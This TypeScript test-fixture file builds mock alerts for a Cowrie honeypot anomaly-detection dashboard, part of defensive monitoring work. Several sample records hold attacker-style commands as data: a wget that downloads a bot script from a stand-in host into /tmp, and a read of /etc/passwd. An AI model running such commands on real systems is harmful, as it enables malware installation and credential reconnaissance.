import type { AlertResponse, AlertSummaryResponse } from '../api/types';

/** A mixed store: 5 persisted records, 2 flagged as outliers, 3 not. */
export function makeSummary(overrides: Partial<AlertSummaryResponse> = {}): AlertSummaryResponse {
  return {
    total_alerts: 5,
    anomaly_count: 2,
    normal_count: 3,
    anomaly_rate: 0.4,
    event_type_counts: { 'cowrie.command.input': 4, 'cowrie.login.failed': 1 },
    source_ip_counts: { '10.0.0.1': 2, '10.0.0.2': 2, '10.0.0.3': 1 },
    score_min: -0.6,
    score_max: 0.4,
    score_average: -0.04,
    ...overrides,
  };
}

/** What a store populated only by flagged results looks like. */
export function makeAllFlaggedSummary(total = 3): AlertSummaryResponse {
  return makeSummary({
    total_alerts: total,
    anomaly_count: total,
    normal_count: 0,
    anomaly_rate: 1,
    score_max: -0.1,
  });
}

export function makeEmptySummary(): AlertSummaryResponse {
  return {
    total_alerts: 0,
    anomaly_count: 0,
    normal_count: 0,
    anomaly_rate: 0,
    event_type_counts: {},
    source_ip_counts: {},
    score_min: null,
    score_max: null,
    score_average: null,
  };
}

/** One persisted alert. Defaults to a flagged command event; override what a test cares about. */
export function makeAlert(overrides: Partial<AlertResponse> = {}): AlertResponse {
  return {
    id: 1,
    timestamp: '2026-08-19T18:00:22.557428Z',
    source_ip: '10.0.0.1',
    session_id: 'sess-0001',
    protocol: 'ssh',
    honeypot: 'cowrie',
    event_type: 'cowrie.command.input',
    command: 'wget http://x.test/bot.sh',
    prediction: -1,
    score: -0.3512,
    is_anomaly: true,
    ...overrides,
  };
}

/**
 * A small mixed list, newest first (ids 5 down to 1, as the API returns it):
 * three event types, two flagged records and three not, one empty command.
 */
export function makeAlerts(): AlertResponse[] {
  return [
    makeAlert({
      id: 5,
      timestamp: '2026-08-19T18:05:00Z',
      source_ip: '10.0.0.1',
      session_id: 'sess-0005',
      command: 'wget http://x.test/bot.sh -O /tmp/bot.sh',
      score: -0.3512,
    }),
    makeAlert({
      id: 4,
      timestamp: '2026-08-19T18:04:00Z',
      source_ip: '10.0.0.2',
      session_id: 'sess-0004',
      event_type: 'cowrie.login.failed',
      command: '',
      prediction: 1,
      score: 0.1204,
      is_anomaly: false,
    }),
    makeAlert({
      id: 3,
      timestamp: '2026-08-19T18:03:00Z',
      source_ip: '10.0.0.3',
      session_id: 'sess-0003',
      command: 'uname -a',
      prediction: 1,
      score: 0.0831,
      is_anomaly: false,
    }),
    makeAlert({
      id: 2,
      timestamp: '2026-08-19T18:02:00Z',
      source_ip: '10.0.0.1',
      session_id: 'sess-0002',
      command: 'cat /etc/passwd',
      score: -0.1877,
    }),
    makeAlert({
      id: 1,
      timestamp: '2026-08-19T18:01:00Z',
      source_ip: '10.0.0.2',
      session_id: 'sess-0001',
      event_type: 'cowrie.login.success',
      command: 'echo ok',
      prediction: 1,
      score: 0.2045,
      is_anomaly: false,
    }),
  ];
}

/** `count` alerts, newest first (ids count down to 1), all flagged the same way. */
export function makeManyAlerts(count: number): AlertResponse[] {
  return Array.from({ length: count }, (_unused, index) => {
    const id = count - index;
    return makeAlert({ id, session_id: `sess-${id}`, command: `echo ${id}` });
  });
}
